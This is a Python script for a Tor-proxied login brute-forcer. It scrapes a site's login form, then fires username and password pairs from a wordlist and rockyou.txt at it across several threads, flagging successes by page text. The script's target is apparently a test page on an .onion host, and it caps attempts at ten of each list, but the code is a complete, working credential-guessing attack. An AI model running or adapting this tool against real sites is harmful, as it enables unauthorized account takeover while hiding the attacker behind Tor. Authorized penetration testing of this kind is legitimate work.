import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError
import json
from tqdm import tqdm

usernames_file = "./dics/usernames.txt"
passwords_file = "./dics/rockyou.txt"

class AdvancedBruteForceScanner:
    
    def __init__(self, urls, proxy_address="127.0.0.1", proxy_port=9050):
        self.urls = urls
        self.session = requests.Session()
        self.proxies = {
            'http': f'socks5h://{proxy_address}:{proxy_port}',
            'https': f'socks5h://{proxy_address}:{proxy_port}'
        }
        self.input_name_users = None
        self.num_threads = 5
        self.results = {}
        self.timeout = 10

    def get_forms(self, url):
        try:
            response = self.session.get(url, proxies=self.proxies, allow_redirects=True, timeout=self.timeout)
            response.raise_for_status()
            soup = BeautifulSoup(response.content, "html.parser")
            return soup.find_all("form")
        except requests.exceptions.RequestException as e:
            print(f"Error al acceder a {url}: {e}")
            return []

    def form_details(self, form):
        details_of_form = {}
        action = form.attrs.get("action")
        method = form.attrs.get("method", "get")
        inputs = []

        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            input_value = input_tag.attrs.get("value", "")
            inputs.append({
                "type": input_type,
                "name": input_name,
                "value": input_value,
            })

        details_of_form['action'] = action
        details_of_form['method'] = method
        details_of_form['inputs'] = inputs
        return details_of_form

    def login_successful(self, response):
        success_messages = [
            "Inicio de sesión exitoso!",
            "Login successful!",
            "Welcome",
        ]

        for message in success_messages:
            if message in response.text:
                return True
        return False

    def send_login_request(self, url, action, method, headers, credentials):
        try:
            if method.lower() == "post":
                res = self.session.post(urljoin(url, action), data=credentials,
                                        headers=headers, proxies=self.proxies, allow_redirects=True, timeout=self.timeout)
            elif method.lower() == "get":
                res = self.session.get(urljoin(url, action), params=credentials,
                                    headers=headers, proxies=self.proxies, allow_redirects=True, timeout=self.timeout)

            res.raise_for_status()

            if self.login_successful(res):
                result = {
                    "url": url,
                    "credentials": credentials,
                    "success": True,
                    "response": res.text
                }
                self.results.setdefault(url, []).append(result)
            elif res.is_redirect:
                new_url = urljoin(url, res.headers.get('location', ''))
                new_response = self.session.get(new_url, proxies=self.proxies, allow_redirects=False, timeout=self.timeout)
                new_response_text = new_response.content.decode('utf-8')
                if self.login_successful(new_response):
                    result = {
                        "url": url,
                        "credentials": credentials,
                        "success": True,
                        "response": new_response_text
                    }
                    self.results.setdefault(url, []).append(result)
        except Exception as e:
            error_message = f"Error: {str(e)}"
            result = {
                "url": url,
                "credentials": credentials,
                "success": False,
                "error": error_message
            }
            self.results.setdefault(url, []).append(result)

    def brute_force(self, usernames_file, passwords_file):
        for url in tqdm(self.urls, desc="Scanning URLs for Brute Force"):  
            input_names = self.find_login_inputs_with_timeout(url)
            if not input_names or not self.input_name_users or len(self.input_name_users) < 2:
                error_message = f"Error: Invalid form inputs in {url}"
                print(error_message)
                result = {
                    "url": url,
                    "error": error_message
                }
                self.results.setdefault(url, []).append(result)
                continue  

            with open(usernames_file, 'r') as user_file:
                usernames = [line.strip() for line in user_file]
            with open(passwords_file, 'r') as password_file:
                passwords = [line.strip() for line in password_file]

            credentials_list = [{self.input_name_users[0]: user, self.input_name_users[1]: password} for user in usernames[:10] for password in passwords[:10]]

            with ThreadPoolExecutor(max_workers=self.num_threads) as executor:
                futures = []
                for credentials in credentials_list:
                    futures.append(executor.submit(self.send_login_request,
                                                   url, input_names['action'], input_names['method'],
                                                   {'User-Agent': 'pentest'}, credentials))
                for future in as_completed(futures):
                    try:
                        future.result(timeout=self.timeout)
                    except Exception as e:
                        print(f"Error en thread: {e}")

        if not self.results:
            return json.dumps({"No encontrado fuerza bruta"})
        return json.dumps(self.results)

    def find_login_inputs_with_timeout(self, url):
        with ThreadPoolExecutor(max_workers=1) as executor:
            future = executor.submit(self.find_login_inputs, url)
            try:
                return future.result(timeout=self.timeout)
            except TimeoutError:
                error_message = f"Error: Timeout retrieving content from {url}"
                print(error_message)
                result = {
                    "url": url,
                    "error": error_message
                }
                self.results.setdefault(url, []).append(result)
                return {}

    def find_login_inputs(self, url):
        try:
            response = self.session.get(url, proxies=self.proxies, timeout=self.timeout)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')
            login_inputs = soup.find_all('input', {'type': ['text', 'password']})
            form = soup.find("form")
            if form is None:
                raise KeyError("Form not found")
            input_names = {'action': form['action'], 'method': form['method']}
            self.input_name_users = [input_tag.attrs.get("name") for input_tag in login_inputs]
            return input_names
        except requests.exceptions.RequestException as e:
            error_message = f"Error: Unable to retrieve content from {url}"
            print(error_message)
            result = {
                "url": url,
                "error": error_message
            }
            self.results.setdefault(url, []).append(result)
            return {}
        except KeyError as ke:
            error_message = f"Error: Unable to find form details in {url}"
            print(error_message)
            result = {
                "url": url,
                "error": error_message
            }
            self.results.setdefault(url, []).append(result)
            return {}


if __name__ == "__main__":
    urls = [
        "http://kz62gxxle6gswe5t6iv6wjt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_bruteforce/prueba_bruteforce.html"
        # Add more URLs here if needed
    ]
    scanner = AdvancedBruteForceScanner(urls)
    results_json = scanner.brute_force(usernames_file, passwords_file)
    print(results_json)
